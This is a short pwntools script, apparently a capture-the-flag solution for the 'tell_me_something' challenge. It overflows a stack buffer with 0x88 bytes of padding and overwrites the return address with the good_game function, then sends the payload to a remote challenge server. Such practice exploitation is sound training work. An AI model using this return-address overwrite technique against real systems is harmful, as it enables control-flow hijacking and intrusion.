from pwn import *


def jarvisoj_tell_me_something(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_tell_me_something'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28430)
    target_elf = ELF(file_name)

    good_game_addr = p64(target_elf.symbols['good_game'])

    payload = b'A' * 0x88
    #  good_game()
    payload += good_game_addr

    # gdb.attach(target)

    target.sendline(payload)

    target.interactive()


if __name__ == '__main__':
    jarvisoj_tell_me_something()
